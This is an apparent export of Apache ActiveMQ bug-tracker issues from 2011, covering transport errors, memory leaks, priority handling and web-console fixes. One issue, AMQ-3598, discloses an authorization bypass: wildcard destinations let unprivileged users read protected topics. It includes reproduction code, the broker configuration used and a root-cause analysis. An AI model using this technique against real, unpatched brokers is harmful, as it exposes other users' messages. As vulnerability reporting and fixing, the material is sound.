According to the ""Connections"" admin web page (and netstat), the affected client is still connected to AMQ. I assume all or most EOFExceptions, SocketExceptions and InactivityIOException are from my fork/connect/subscribe/exit script.;;;","13/Dec/11 23:14;tabish;Fix applied in trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
when using http transport xstream cannot construct org.apache.activemq.util.ByteSequence as it does not have a no-args constructor ,AMQ-3601,12532121,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,jacobs,jacobs,21/Nov/11 07:54,12/Dec/11 16:27,14/Jul/23 05:43,12/Dec/11 16:27,,,,,,5.6.0,,,,,,,0,patch,,,,,,,,A no-args constructor should be added to org.apache.activemq.util.ByteSequence,,dpishchukhin,jacobs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"21/Nov/11 07:57;jacobs;ByteSequence.patch;https://issues.apache.org/jira/secure/attachment/12504476/ByteSequence.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,217857,,,Mon Dec 12 16:27:26 UTC 2011,,,,,,,Patch Available,,,,"0|i0aijb:",59276,,,,,,,,,,,,,,,,,,,,,"12/Dec/11 16:27;tabish;fix applied in trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failover reconnect bypasses DestinationPathSeparatorBroker generating invalid destinations,AMQ-3600,12531805,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,17/Nov/11 15:06,17/Nov/11 15:11,14/Jul/23 05:43,17/Nov/11 15:11,5.5.0,,,,,5.6.0,,,Broker,,,,0,destinationPathSeparatorPlugin,failover,,,,,,,"impl from https://issues.apache.org/jira/browse/AMQ-3204 - the broker filter needs to intercept processConsumerControl and for good measure messagePull

The processConsumerControl is used on failover recovery and will result in destination creation with out the separator replacement.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,217541,,,Thu Nov 17 15:11:33 UTC 2011,,,,,,,,,,,"0|i0aijj:",59277,,,,,,,,,,,,,,,,,,,,,"17/Nov/11 15:11;gtully;fix and test in http://svn.apache.org/viewvc?rev=1203213&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"JaasDualAuthenticationPlugin, java.net.BindException: Address already in use on shutdown with pending connectons",AMQ-3599,12531771,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,gtully,gtully,17/Nov/11 10:47,17/Nov/11 12:50,14/Jul/23 05:43,17/Nov/11 12:50,5.5.0,,,,,5.6.0,,,Transport,,,,0,,,,,,,,,"The check for an ssl connection is causing re-init of the transport server in error.
Exception from the logs at shutdown:
{code}2011-11-15 16:43:18,997 [139:53398-29324] WARN  Service                        - Failed to remove connection ConnectionInfo {}, reason: java.io.IOException: Failed to bind to server socket: stomp://0.0.0.0:6163?transport.closeAsync=false&transport.keepAlive=true&transport.soLinger=0 due to: java.net.BindException: Address already in use
2011-11-15 16:43:18,997 [139:53398-29324] DEBUG Service                        - Exception detail:
java.io.IOException: Failed to bind to server socket: stomp://0.0.0.0:6163?transport.closeAsync=false&transport.keepAlive=true&transport.soLinger=0 due to: java.net.BindException: Address already in use
	at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:33)
	at org.apache.activemq.transport.tcp.TcpTransportServer.bind(TcpTransportServer.java:139)
	at org.apache.activemq.transport.tcp.TcpTransportFactory.doBind(TcpTransportFactory.java:60)
	at org.apache.activemq.transport.TransportFactory.bind(TransportFactory.java:131)
	at org.apache.activemq.broker.TransportConnector.createTransportServer(TransportConnector.java:315)
	at org.apache.activemq.broker.TransportConnector.getServer(TransportConnector.java:145)
	at org.apache.activemq.security.JaasDualAuthenticationBroker.removeConnection(JaasDualAuthenticationBroker.java:111)
	at org.apache.activemq.broker.BrokerFilter.removeConnection(BrokerFilter.java:113)
	at org.apache.activemq.broker.MutableBrokerFilter.removeConnection(MutableBrokerFilter.java:119)
	at org.apache.activemq.broker.TransportConnection.processRemoveConnection(TransportConnection.java:757)
	at org.apache.activemq.broker.TransportConnection.doStop(TransportConnection.java:1036)
	at org.apache.activemq.broker.jmx.ManagedTransportConnection.doStop(ManagedTransportConnection.java:73)
	at org.apache.activemq.broker.TransportConnection$3.run(TransportConnection.java:964)
	at java.lang.Thread.run(Thread.java:662)
Caused by: java.net.BindException: Address already in use
	at java.net.PlainSocketImpl.socketBind(Native Method)
	at java.net.PlainSocketImpl.bind(PlainSocketImpl.java:383)
	at java.net.ServerSocket.bind(ServerSocket.java:328)
	at java.net.ServerSocket.<init>(ServerSocket.java:194)
	at javax.net.DefaultServerSocketFactory.createServerSocket(ServerSocketFactory.java:170)
	at org.apache.activemq.transport.tcp.TcpTransportServer.bind(TcpTransportServer.java:135)
	... 12 more{code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,217507,,,Thu Nov 17 12:50:31 UTC 2011,,,,,,,,,,,"0|i0aijr:",59278,,,,,,,,,,,,,,,,,,,,,"17/Nov/11 12:50;gtully;resolved in http://svn.apache.org/viewvc?rev=1203176&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Unprivileged users can receive messages from a protected topic when using wildcards in destination,AMQ-3598,12531481,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,panitz,panitz,15/Nov/11 16:05,03/Jun/15 18:07,14/Jul/23 05:43,03/Jun/15 18:07,5.5.0,5.5.1,,,,5.12.0,,,Broker,,,,1,authorization,security,,,,,,,"A consumer can receive messages from protected queues/topics if he uses a Destination which contains a wildcard as described [here|http://activemq.apache.org/wildcards.html]:

{code:language=java}
Destination queue = new ActiveMQQueue(""messages.>"");
Destination topic = new ActiveMQTopic("">"");
{code}

We are using the default authentication/authorization system as described in [Security Authentication/Authorization|http://activemq.apache.org/security.html#Security-Authorization] with the following configuration:

{code:title=broker.xml|language=xml}
<plugins>
    <simpleAuthenticationPlugin>
        <users>
            <authenticationUser
                  username=""admin""
                  password=""admin""
                  groups=""admins""/>
            <authenticationUser
                  username=""user""
                  password=""user""
                  groups=""users""/>
        </users>
    </simpleAuthenticationPlugin>
    <authorizationPlugin>
        <map>
            <authorizationMap>
                <authorizationEntries>
                    <authorizationEntry topic=""messages.>""
                                        read=""admins""
                                        write=""admins""
                                        admin=""admins""/>
                    <authorizationEntry topic=""messages.cat2""
                                        read=""admins""
                                        write=""admins""
                                        admin=""admins""/>
                    <authorizationEntry topic=""messages.cat1""
                                        read=""admins, users""
                                        write=""admins, users""
                                        admin=""admins, users""/>
                    <authorizationEntry topic=""ActiveMQ.Advisory.>""
                                        read=""admins, users""
                                        write=""admins, users""
                                        admin=""admins, users""/>
                </authorizationEntries>
            </authorizationMap>
        </map>
    </authorizationPlugin>
</plugins>
{code}

As exepected, clients connecting as ""user"" to the topic ""messages.cat2"" get an exception (""User user is not authorized to read from: topic://messages.cat2""). Suprisingly ""user"" can receive messages from topic ""messages.cat2"" if he creates a consumer with the destination ""messages.>"":

{code:title=consumer.java|language=java}
final Destination destination = new ActiveMQTopic(""messages.>"");
final Connection conn = new ActiveMQConnectionFactory(""user"", ""user"", BROKER_URL).createConnection();
final Session session = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);
final MessageConsumer consumer = session.createConsumer(destination);
conn.start();
closure.run();
final Message message = consumer.receive(TIMEOUT);
session.close();
conn.close(); 
{code}

IMHO this behaviour is a security problem as an unprivileged user can receive messages from a protected topic or queue!","OS: Mac OS X 10.6.8
JRE/JDK: 1.6.0_29
ActiveMQ: 5.5.0",areese,lionel.cons,panitz,tabish,tmielke,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Nov/11 11:54;tmielke;AMQ-3598.patch;https://issues.apache.org/jira/secure/attachment/12504057/AMQ-3598.patch","15/Nov/11 16:08;panitz;ActiveMQAuthorizationBug.zip;https://issues.apache.org/jira/secure/attachment/12503758/ActiveMQAuthorizationBug.zip",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,217217,,,Wed Jun 03 18:07:12 UTC 2015,,,,,,,,,,,"0|i0eagf:",81456,,,,,,,,,,,,,,,,,,,,,"15/Nov/11 16:08;panitz;Added a maven project with junit tests showing the problem.;;;","17/Nov/11 09:12;tmielke;I have spent a bit of time on this issue. 
The problem seems to be in org.apache.activemq.filter.DestinationMapNode.appendMatchingValues()

{code:title=DestinationMapNode.java}
public void appendMatchingValues(Set answer, String[] paths, int startIndex) {
  DestinationNode node = this;
  boolean couldMatchAny = true;
  int size = paths.length;
  for (int i = startIndex; i < size && node != null; i++) {
    String path = paths[i];
    if (path.equals(ANY_DESCENDENT)) {
      answer.addAll(node.getDesendentValues());
      couldMatchAny = false;
      break;
    }
    ...
{code}

This method iterates through the nodes and if it hits '>' descendant, it simply adds all privileges of all child nodes. 

So if the authorization config reads:
{code:xml}
<authorizationEntry topic=""messages.>""
  read=""admins""
  write=""admins""
  admin=""admins""/>
<authorizationEntry topic=""messages.cat1""
  read=""admins, users""
  write=""admins, users""
  admin=""admins, users""/>
{code} 

then this code will add the privileges of messages.cat2 to messages.>, as in its internal representation ""messages.cat2"" is a subnode of ""messages.>"".
This privilege inheritance does not look correct to me. 

Should it instead not only grant the priviliges defined explicitly for ""messages.>""? ;;;","17/Nov/11 11:54;tmielke;Attaching a possible patch including JUnit tests that are based on the tests uploaded by Thorsten Parnitz.

With this patch privileges of subnodes are not added.  ;;;","03/Jun/15 18:07;tabish;Ran the included tests against a 5.12-SNAPSHOT build and all works as expected.  There has been some work in this area for other MQTT and related issues.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
FilePendingMessageCursor memory list does not respect priority for non persistent messages,AMQ-3596,12531446,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,15/Nov/11 12:19,15/Nov/11 12:22,14/Jul/23 05:43,15/Nov/11 12:22,5.5.1,,,,,5.6.0,,,Broker,,,,0,nonpersistent,priority,,,,,,,"Priority support for non persistent messages is broken if all messages remain in memory. The first dispatch will in receipt order so the consumers ordering is not sufficient.
Problem: the default store cursor uses a file pending cursor for non persistent messages, but the in memory list is not priority aware.
Work around: is to use the vmCursor or to disable broker persistence.
Fix: is to make use of the PendingList from a vm cursor for the memory list of a file pending message cursor.
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,217182,,,Tue Nov 15 12:22:15 UTC 2011,,,,,,,,,,,"0|i0aijz:",59279,,,,,,,,,,,,,,,,,,,,,"15/Nov/11 12:22;gtully;fix in http://svn.apache.org/viewvc?rev=1202153&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq-web REST servlet support for JMSType is broken via typo,AMQ-3590,12531166,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,cdolan,cdolan,11/Nov/11 19:00,11/Nov/11 21:15,14/Jul/23 05:43,11/Nov/11 21:15,5.5.0,,,,,5.6.0,,,,,,,0,,,,,,,,,"As seen here:

        String type = (String)asString(parameters.remove(""JMSType""));
        if (correlationID != null) {
            message.setJMSType(type);
        }

http://svn.apache.org/viewvc/activemq/trunk/activemq-web/src/main/java/org/apache/activemq/web/MessageServletSupport.java?revision=1177445&view=markup#l130

there is a copy-paste typo in the MessageServletSupport class. The null-check conditional should check the ""type"" variable instead of ""correlationId"".",,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,216904,,,Fri Nov 11 21:15:38 UTC 2011,,,,,,,,,,,"0|i0aik7:",59280,,,,,,,,,,,,,,,,,,,,,"11/Nov/11 21:15;tabish;Fix applied in trunk, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PooledSession - Can cause memory leak in case many consumers is created by the session,AMQ-3588,12531028,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,davsclaus,davsclaus,davsclaus,10/Nov/11 17:07,20/Mar/13 12:01,14/Jul/23 05:43,10/Nov/11 20:28,,,,,,5.6.0,,,Camel,,,,0,activemq-pool,"camel,",,,,,,,"See (CAMEL-4657

In the activemq-pool we have a memory leak when a PooledSession is used to create many consumers. As each consumer is added to an internal list, which in case the session is closed, the list is used to ensure all previously created consumers gets closed as well.

However if the session is used to create many consumers, then that internal list just keep growing, and causing OOME. See attached screenshots of a before vs after with the bug fix.

So to remedy this situation, we should ensure any closed consumer gets removed from that internal list. As its already closed, and therefore the session do not need to keep track of it anymore.

This bug have existed ever since AMQ-615.

The impact of this bug can be seen in CAMEL-4657, which essentially makes using Camel for request/reply over JMS with AMQ and with named replyTo queues (eg not temporary) will cause this problem. The problem manifests due Spring DMLC, which uses a MessageSelector to only pickup expected reply messages. And because the MessageSelector is created once when the consumer is created. We need to create a new Consumer, every time a new message is doing request/reply, to ensure the Message Selector gets updated. So in that situation many consumers get created, which leads to OOME as the list in PooledSession keeps growing.

It would be great if this bug fix can be backported to the 5.5 branch as well.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4370,,,,,,,,,,,,,,,,,,,,,,,,,CAMEL-4657,,,"10/Nov/11 17:09;davsclaus;AMQ-3588.patch;https://issues.apache.org/jira/secure/attachment/12503256/AMQ-3588.patch","10/Nov/11 17:09;davsclaus;after.png;https://issues.apache.org/jira/secure/attachment/12503255/after.png","10/Nov/11 17:08;davsclaus;before.png;https://issues.apache.org/jira/secure/attachment/12503254/before.png",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,216766,,,Thu Nov 10 20:28:42 UTC 2011,,,,,,,,,,,"0|i0aikn:",59282,,,,,,,,,,,,,,,,,,,,,"10/Nov/11 17:08;davsclaus;Before is a test with 50.000 messages showing a memory leak of about 200mb;;;","10/Nov/11 17:09;davsclaus;After is the same test with 50.000 messages and this time no memory leak;;;","10/Nov/11 17:09;davsclaus;The patch;;;","10/Nov/11 20:28;tabish;Patch looks good, applied in trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveIO active file count not initialized properly,AMQ-3587,12531000,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,tsen,tsen,10/Nov/11 13:49,09/Feb/12 21:37,14/Jul/23 05:43,09/Feb/12 21:37,,,,,,,,,,,,,0,,,,,,,,,"Even when started with an existing log, the LogFileManager initializes activeLogFileCount to zero. This leads to LogFileManager.isPastHalfActive() to incorrectly return false and no JournalEventListener.overflowNotification() being issued.",activeio-core-3.1.3,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Nov/11 13:52;tsen;patch.txt;https://issues.apache.org/jira/secure/attachment/12503210/patch.txt",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,216738,,,Thu Feb 09 21:37:44 UTC 2012,,,,,,,,,,,"0|i0s0ev:",161543,,,,,,,,,,,,,,,,,,,,,"10/Nov/11 13:52;tsen;Since LogFileManager.initialize() iterates over all log files, quering the active status, updating activeLogFileCount can be done here.

See patch for details. ;;;","09/Feb/12 21:37;tabish;Fix applied.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
spaces in queue name,AMQ-3586,12530971,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,darius.schier,darius.schier,10/Nov/11 08:17,20/Sep/12 02:15,14/Jul/23 05:43,03/Feb/12 18:47,5.5.0,,,,,5.6.0,,,,,,,0,,,,,,,,,"Creating a queue that's name contains trailing blanks leads to several problems.
Try the following within amq web console to reproduce:
- create a queue with name '123  ' (without quotes)
- create a second queue with name '123 ' (without quotes)
- send a message to one of them

--> amq creates a third queue, all three of them seem to have the same name within the browser, at jmx-level you see that there are three (with spaces)
--> Number of Pending messages is 1 for the queue I've send the message and 0 for the other two
--> if you click on the queue name within the amq browser, you see the same message within all three queues
--> adding a consumer to one queue adds the same consumer to all of them
",linux,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4040,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,216709,,,Fri Feb 03 18:47:08 UTC 2012,,,,,,,,,,,"0|i0aikv:",59283,,,,,,,,,,,,,,,,,,,,,"01/Feb/12 20:28;tabish;What are you using to create the Queue's web console, admin tool?  The web console was patched no to long ago to trim leading and trailing whitespace from the forms to prevent this sort of thing.;;;","02/Feb/12 14:51;darius.schier;We created the destination's names with the standard activemq web console. It still seems to be possible (5.5.0).
I even got to manage it that the identical message was sent to '123' and '123 ', although I addressed only one of them (also through the web console).;;;","02/Feb/12 14:56;tabish;It shouldn't have this issue if you use the 5.6-SNAPSHOT.;;;","03/Feb/12 18:47;tabish;Fix applied in trunk to prevent the other tools like jconsole or command line from letting spaces into the ends of the destination names, will be in the next snapshot.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ Performance module is not useable per instructions,AMQ-3584,12530906,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,jdillon,jdillon,09/Nov/11 18:22,05/Dec/12 20:05,14/Jul/23 05:43,05/Dec/12 20:05,,,,,,,,,,,,,0,,,,,,,,,"I was looking at http://activemq.apache.org/activemq-performance-module-users-manual.html to see how well (or poorly) the http transport was over the tcp transport and I've run into some issues just following the instructions.

svn co http://svn.apache.org/repos/asf/activemq/sandbox/activemq-perftest/
cd activemq-perftest
mvn activemq-perf:broker -Durl=broker:tcp://localhost:61616

{noformat}
[INFO] Scanning for projects...
[ERROR] The build could not read 1 project -> [Help 1]
[ERROR]   
[ERROR]   The project org.apache.activemq:activemq-perftest:5.2-SNAPSHOT (/Users/jason/ws/reference/activemq-perftest/pom.xml) has 1 error
[ERROR]     Non-resolvable parent POM: Could not find artifact org.apache.activemq:activemq-parent:pom:5.2-SNAPSHOT and 'parent.relativePath' points at wrong local POM @ line 22, column 13 -> [Help 2]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/ProjectBuildingException
[ERROR] [Help 2] http://cwiki.apache.org/confluence/display/MAVEN/UnresolvableModelException
{noformat}

If I change the version to 5.5.1:

{noformat}
Index: pom.xml
===================================================================
--- pom.xml	(revision 1199413)
+++ pom.xml	(working copy)
@@ -22,7 +22,7 @@
    <parent>
        <artifactId>activemq-parent</artifactId>
        <groupId>org.apache.activemq</groupId>
-        <version>5.2-SNAPSHOT</version>
+        <version>5.5.1</version>
    </parent>

    <artifactId>activemq-perftest</artifactId>
{noformat}

mvn activemq-perf:broker -Durl=broker:tcp://localhost:61616

{noformat}
[INFO] Scanning for projects...
[WARNING] 
[WARNING] Some problems were encountered while building the effective model for org.apache.activemq:activemq-perftest:jar:5.5.1
[WARNING] 'build.plugins.plugin.version' for org.apache.activemq.tooling:maven-activemq-perf-plugin is missing. @ line 35, column 21
[WARNING] 'build.plugins.plugin.version' for org.apache.activemq.tooling:maven-activemq-memtest-plugin is missing. @ line 39, column 21
[WARNING] 
[WARNING] It is highly recommended to fix these problems because they threaten the stability of your build.
[WARNING] 
[WARNING] For this reason, future Maven versions might no longer support building such malformed projects.
[WARNING] 
[INFO]                                                                         
[INFO] ------------------------------------------------------------------------
[INFO] Building ActiveMQ :: Performance Test 5.5.1
[INFO] ------------------------------------------------------------------------
[INFO] 
[INFO] --- maven-activemq-perf-plugin:5.5.1:broker (default-cli) @ activemq-perftest ---
Java Runtime: Apple Inc. 1.6.0_26 /System/Library/Java/JavaVirtualMachines/1.6.0.jdk/Contents/Home
 Heap sizes: current=83008k  free=60712k  max=517760k
   JVM args: -Xmx512m -XX:MaxPermSize=128m -Dclassworlds.conf=/Users/jason/tools/maven/maven3/bin/m2.conf -Dmaven.home=/Users/jason/tools/maven/maven3
ACTIVEMQ_HOME: /Users/jason/.m2/repository/org/apache/activemq/activemq-console
ACTIVEMQ_BASE: /Users/jason/.m2/repository/org/apache/activemq/activemq-console
Loading message broker from: broker:tcp://localhost:61616
SLF4J: Failed to load class ""org.slf4j.impl.StaticLoggerBinder"".
SLF4J: See http://www.slf4j.org/codes.html#StaticLoggerBinder for further details.
Failed to execute main task. Reason: java.lang.NoClassDefFoundError: org/slf4j/impl/StaticLoggerBinder
{noformat}

So I configured logback & upgraded slf4j:

{noformat}
Index: pom.xml
===================================================================
--- pom.xml	(revision 1199413)
+++ pom.xml	(working copy)
@@ -22,7 +22,7 @@
    <parent>
        <artifactId>activemq-parent</artifactId>
        <groupId>org.apache.activemq</groupId>
-        <version>5.2-SNAPSHOT</version>
+        <version>5.5.1</version>
    </parent>

    <artifactId>activemq-perftest</artifactId>
@@ -35,6 +35,18 @@
            <plugin>
                <groupId>org.apache.activemq.tooling</groupId>
                <artifactId>maven-activemq-perf-plugin</artifactId>
+                <dependencies>
+                    <dependency>
+                        <groupId>org.slf4j</groupId>
+                        <artifactId>slf4j-api</artifactId>
+                        <version>1.6.2</version>
+                    </dependency>
+                    <dependency>
+                        <groupId>ch.qos.logback</groupId>
+                        <artifactId>logback-classic</artifactId>
+                        <version>1.0.0</version>
+                    </dependency>
+                </dependencies>
            </plugin>
            <plugin>
                <groupId>org.apache.activemq.tooling</groupId>
{noformat}

... and now it seems to function.",,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,216644,,,Wed Dec 05 20:05:22 UTC 2012,,,,,,,,,,,"0|i0eahb:",81460,,,,,,,,,,,,,,,,,,,,,"09/Nov/11 18:23;jdillon;Probably need to configure a basic terse logging configuration as well, so that logging doesn't affect the perf numbers.;;;","05/Dec/12 20:05;tabish;updated the pom for the smaple project to reflect new versions and the future v5.8.0 plugin name changes.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Web Console: escape link urls,AMQ-3581,12530722,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,08/Nov/11 14:26,08/Nov/11 14:30,14/Jul/23 05:43,08/Nov/11 14:30,5.5.1,,,,,5.6.0,,,,,,,0,,,,,,,,,"This should allow management of destinations and durable subscriptions with names containing special chars, like #,%,&,+, etc",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,216460,,,Tue Nov 08 14:30:38 UTC 2011,,,,,,,,,,,"0|i0ail3:",59284,,,,,,,,,,,,,,,,,,,,,"08/Nov/11 14:30;dejanb;Fixed with svn revision 1199259;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
